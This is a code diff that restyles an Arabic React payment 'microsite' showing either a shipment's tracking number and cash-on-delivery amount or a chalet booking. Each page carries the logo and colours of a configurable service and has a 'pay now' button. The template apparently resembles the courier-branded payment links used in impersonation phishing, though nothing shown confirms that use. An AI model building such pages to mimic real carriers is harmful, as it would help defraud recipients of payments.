@@ -20,6 +20,7 @@ import {
   Hash,
   RefreshCw,
   AlertTriangle,
+  ArrowLeft,
 } from "lucide-react";
 
 const Microsite = () => {
@@ -214,184 +215,125 @@ const Microsite = () => {
           serviceName={serviceName}
           serviceDescription={serviceDescription}
         />
-        <div className="min-h-screen py-12 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
-      <div className="container mx-auto px-4">
-        <div className="max-w-4xl mx-auto">
-          {/* Header Badge */}
-          <div className="text-center mb-8">
-            <Badge className="text-lg px-6 py-2 bg-gradient-primary">
-              <Shield className="w-4 h-4 ml-2" />
-              <span>عقد موثّق ومحمي</span>
-            </Badge>
-          </div>
-          
-          {/* Main Card */}
-          <Card className="overflow-hidden shadow-elevated">
-            {/* Header with Country Colors */}
-            <div
-              className="h-32 relative"
-              style={{
-                background: countryData 
-                  ? `linear-gradient(135deg, ${countryData.primaryColor || '#0EA5E9'}, ${countryData.secondaryColor || '#06B6D4'})`
-                  : 'linear-gradient(135deg, #0EA5E9, #06B6D4)',
-              }}
-            >
-              <div className="absolute inset-0 bg-black/20" />
-              <div className="absolute bottom-4 right-6 text-white">
-                <h1 className="text-3xl font-bold">{isShipping ? serviceName : (payload.chalet_name || 'شاليه')}</h1>
-                <p className="text-lg opacity-90">{countryData?.nameAr || country || 'الدولة'}</p>
-              </div>
-            </div>
+        <div 
+          className="min-h-screen bg-background" 
+          dir="rtl"
+        >
+          {/* Hero Section - matching other payment pages */}
+          <div className="relative w-full h-48 sm:h-64 overflow-hidden">
+            {serviceBranding?.heroImage && (
+              <img 
+                src={serviceBranding.heroImage} 
+                alt={serviceName}
+                className="w-full h-full object-cover"
+              />
+            )}
+            <div className="absolute inset-0 bg-gradient-to-b from-black/60 via-black/40 to-black/70" />
             
-            {/* Content */}
-            <div className="p-8">
-              {/* Service/Chalet Image */}
-              {isShipping && serviceBranding.heroImage ? (
-                <div className="aspect-video rounded-xl mb-6 overflow-hidden">
+            {/* Logo Overlay */}
+            <div className="absolute top-4 left-4 sm:top-6 sm:left-6">
+              {serviceBranding?.logo && (
+                <div className="bg-white rounded-2xl p-3 sm:p-4 shadow-lg">
                   <img 
-                    src={serviceBranding.heroImage} 
+                    src={serviceBranding.logo} 
                     alt={serviceName}
-                    className="w-full h-full object-cover"
+                    className="h-12 sm:h-16 w-auto"
+                    onError={(e) => e.currentTarget.style.display = 'none'}
                   />
                 </div>
-              ) : (
-                <div className="aspect-video bg-gradient-card rounded-xl mb-6 flex items-center justify-center">
-                  {isShipping ? (
-                    <Truck className="w-16 h-16 text-muted-foreground" />
-                  ) : (
-                    <Sparkles className="w-16 h-16 text-muted-foreground" />
-                  )}
-                </div>
               )}
-              
-              {/* Service Info for Shipping */}
-              {isShipping && (
-                <div className="mb-6 p-4 bg-secondary/20 rounded-lg border">
-                  <div className="flex items-center gap-3 mb-2">
-                    <Package className="w-5 h-5 text-primary" />
-                    <h3 className="font-bold text-lg">{serviceName}</h3>
+            </div>
+            
+            {/* Title Overlay */}
+            <div className="absolute bottom-4 right-4 sm:bottom-6 sm:right-6 text-white">
+              <div className="text-right">
+                <h2 className="text-lg sm:text-2xl font-bold mb-1">{isShipping ? serviceName : (payload.chalet_name || 'شاليه')}</h2>
+                <p className="text-xs sm:text-sm opacity-90">{isShipping ? 'خدمة شحن' : 'حجز شاليه'}</p>
+              </div>
+            </div>
+          </div>
+
+          <div className="container mx-auto px-3 sm:px-4 -mt-8 sm:-mt-12 relative z-10">
+            <div className="max-w-2xl mx-auto">
+              <Card 
+                className="p-4 sm:p-8 shadow-2xl border-t-4" 
+                style={{ borderTopColor: serviceBranding?.colors?.primary || '#006C35' }}
+              >
+                {/* Header - matching other pages */}
+                <div className="flex items-center justify-between mb-6 sm:mb-8">
+                  <h1 className="text-xl sm:text-3xl font-bold">
+                    {isShipping ? 'تتبع وتأكيد الدفع' : 'تفاصيل الحجز'}
+                  </h1>
+                  
+                  <div
+                    className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
+                    style={{
+                      background: `linear-gradient(135deg, ${serviceBranding?.colors?.primary || '#006C35'}, ${serviceBranding?.colors?.secondary || '#004A2C'})`,
+                    }}
+                  >
+                    <Package className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
                   </div>
-                  <p className="text-sm text-muted-foreground">{serviceDescription}</p>
                 </div>
-              )}
-              
-              {/* Details Grid */}
-              <div className="grid md:grid-cols-2 gap-6 mb-8">
-                {isShipping ? (
-                  <>
-                    <div className="flex items-start gap-3">
-                      <Hash className="w-5 h-5 text-primary mt-1" />
-                      <div>
-                        <p className="font-semibold mb-1">رقم الشحنة</p>
-                        <p className="text-muted-foreground text-sm">
-                          {payload.tracking_number || 'غير محدد'}
-                        </p>
-                      </div>
+
+                {/* Content */}
+                {/* Shipping Info Display - matching PaymentDetails */}
+                {(isShipping && payload) && (
+                  <div className="mb-6 sm:mb-8 p-3 sm:p-4 rounded-lg bg-muted/50">
+                    <h3 className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base">تفاصيل الشحنة</h3>
+                    <div className="space-y-2 text-xs sm:text-sm">
+                      {payload.tracking_number && (
+                        <div className="flex items-center gap-2">
+                          <Hash className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
+                          <span className="text-muted-foreground">رقم الشحنة:</span>
+                          <span className="font-semibold">{payload.tracking_number}</span>
+                        </div>
+                      )}
+                      {payload.package_description && (
+                        <div className="flex items-center gap-2">
+                          <Truck className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
+                          <span className="text-muted-foreground">وصف الطرد:</span>
+                          <span className="font-semibold">{payload.package_description}</span>
+                        </div>
+                      )}
+                      {(payload.cod_amount || 0) > 0 && (
+                        <div className="flex items-center gap-2">
+                          <CreditCard className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
+                          <span className="text-muted-foreground">مبلغ COD:</span>
+                          <span className="font-semibold">{formatCurrency(payload.cod_amount || 0, countryData?.currency || 'ر.س')}</span>
+                        </div>
+                      )}
                     </div>
-                    
-                    
-                    <div className="flex items-start gap-3">
-                      <Truck className="w-5 h-5 text-primary mt-1" />
-                      <div>
-                        <p className="font-semibold mb-1">وصف الطرد</p>
-                        <p className="text-muted-foreground text-sm">
-                          {payload.package_description || 'غير محدد'}
-                        </p>
-                      </div>
-                    </div>
-                    
-                    <div className="flex items-start gap-3">
-                      <CreditCard className="w-5 h-5 text-primary mt-1" />
-                      <div>
-                        <p className="font-semibold mb-1">مبلغ الدفع</p>
-                        <p className="text-muted-foreground text-sm">
-                          {formatCurrency(payload.cod_amount || 0, countryData?.currency || 'ر.س')}
-                        </p>
-                      </div>
-                    </div>
-                  </>
-                ) : (
-                  <>
-                    <div className="flex items-start gap-3">
-                      <MapPin className="w-5 h-5 text-primary mt-1" />
-                      <div>
-                        <p className="font-semibold mb-1">الموقع</p>
-                        <p className="text-muted-foreground text-sm">
-                          {isShipping ? serviceName : (payload.chalet_name || 'شاليه')}
-                        </p>
-                      </div>
-                    </div>
-                    
-                    <div className="flex items-start gap-3">
-                      <Users className="w-5 h-5 text-primary mt-1" />
-                      <div>
-                        <p className="font-semibold mb-1">عدد الضيوف</p>
-                        <p className="text-muted-foreground text-sm">
-                          {payload.guest_count || 2} ضيف
-                        </p>
-                      </div>
-                    </div>
-                    
-                    <div className="flex items-start gap-3">
-                      <CheckCircle2 className="w-5 h-5 text-primary mt-1" />
-                      <div>
-                        <p className="font-semibold mb-1">المدة</p>
-                        <p className="text-muted-foreground text-sm">
-                          {payload.nights || 1} ليلة
-                        </p>
-                      </div>
-                    </div>
-                    
-                    <div className="flex items-start gap-3">
-                      <CreditCard className="w-5 h-5 text-primary mt-1" />
-                      <div>
-                        <p className="font-semibold mb-1">السعر / الليلة</p>
-                        <p className="text-muted-foreground text-sm">
-                          {formatCurrency(payload.price_per_night || 0, countryData?.currency || 'ر.س')}
-                        </p>
-                      </div>
-                    </div>
-                  </>
+                  </div>
                 )}
-              </div>
+                
+                {/* Payment Summary - matching PaymentDetails */}
+                <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
+                  <div className="flex justify-between py-2 sm:py-3 border-b border-border text-sm sm:text-base">
+                    <span className="text-muted-foreground">الخدمة</span>
+                    <span className="font-semibold">{isShipping ? serviceName : (payload.chalet_name || 'شاليه')}</span>
+                  </div>
+                  
+                  <div 
+                    className="flex justify-between py-3 sm:py-4 rounded-lg px-3 sm:px-4"
+                    style={{
+                      background: `linear-gradient(135deg, ${serviceBranding?.colors?.primary || '#006C35'}15, ${serviceBranding?.colors?.secondary || '#004A2C'}15)`
+                    }}
+                  >
+                    <span className="text-base sm:text-lg font-bold">المبلغ الإجمالي</span>
+                    <span className="text-xl sm:text-2xl font-bold" style={{ color: serviceBranding?.colors?.primary || '#006C35' }}>
+                      {formatCurrency(isShipping ? (payload.cod_amount || 0) : (payload.total_amount || 0), countryData?.currency || 'ر.س')}
+                    </span>
+                  </div>
+                </div>
               
-              {/* Total Amount */}
-              <div className="bg-gradient-primary p-6 rounded-xl text-primary-foreground mb-6">
-                <p className="text-sm mb-2 opacity-90">المبلغ الإجمالي</p>
-                <p className="text-5xl font-bold mb-2">
-                  {formatCurrency(isShipping ? (payload.cod_amount || 0) : (payload.total_amount || 0), countryData?.currency || 'ر.س')}
-                </p>
-                <p className="text-sm opacity-80">
-                  {isShipping ? 'مبلغ الدفع عند الاستلام' : `${payload.price_per_night || 0} × ${payload.nights || 1} ليلة`}
-                </p>
-              </div>
-              
-              {/* Terms */}
-              <div className="bg-secondary/30 p-4 rounded-lg mb-6">
-                <h3 className="font-bold mb-2">{isShipping ? 'شروط الشحن' : 'شروط الحجز'}</h3>
-                <ul className="text-sm text-muted-foreground space-y-1">
-                  {isShipping ? (
-                    <>
-                      <li>• الدفع مطلوب عند استلام الطرد</li>
-                      <li>• تأكد من صحة العنوان قبل الدفع</li>
-                      <li>• الطرد محمي ومؤمن عليه</li>
-                      <li>• يمكن تتبع الطرد في أي وقت</li>
-                    </>
-                  ) : (
-                    <>
-                      <li>• الدفع بالكامل مطلوب لتأكيد الحجز</li>
-                      <li>• سياسة الإلغاء: استرداد 50% قبل 7 أيام</li>
-                      <li>• الحد الأقصى للضيوف يجب احترامه</li>
-                      <li>• التدخين ممنوع داخل الشاليه</li>
-                    </>
-                  )}
-                </ul>
-              </div>
               
               {/* Payment Button */}
               <Button
                 size="lg"
-                className="w-full text-xl py-7 shadow-glow animate-pulse-glow"
+                className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
+                style={{
+                  background: `linear-gradient(135deg, ${serviceBranding?.colors?.primary || '#006C35'}, ${serviceBranding?.colors?.secondary || '#004A2C'})`
+                }}
                 onClick={() => {
                   try {
                     if (link?.id) {
@@ -406,18 +348,18 @@ const Microsite = () => {
                   }
                 }}
               >
-                <CreditCard className="w-6 h-6 ml-3" />
+                <CreditCard className="w-4 h-4 sm:w-5 sm:h-5 ml-2" />
                 <span>ادفع الآن</span>
+                <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
               </Button>
               
-              <p className="text-xs text-center text-muted-foreground mt-4">
-                دفع آمن ومحمي بتقنيات التشفير العالمية
-              </p>
+                <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
+                  بالمتابعة، أنت توافق على الشروط والأحكام
+                </p>
+              </Card>
             </div>
-          </Card>
+          </div>
         </div>
-      </div>
-    </div>
     </>
     );
   } catch (renderError) {
